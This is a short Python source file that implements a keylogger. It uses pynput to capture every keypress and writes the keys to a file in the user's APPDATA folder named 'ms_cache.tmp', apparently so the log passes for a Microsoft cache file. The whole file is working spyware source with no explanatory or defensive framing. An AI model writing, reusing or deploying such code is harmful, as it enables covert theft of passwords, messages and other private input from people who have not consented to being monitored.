# core.py
from pynput import keyboard
import os

log_file = os.path.join(os.getenv('APPDATA'), "ms_cache.tmp")

def log_key(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except:
        with open(log_file, "a") as file:
            file.write(f"[{key}]")

keyboard.Listener(on_press=log_key).start()
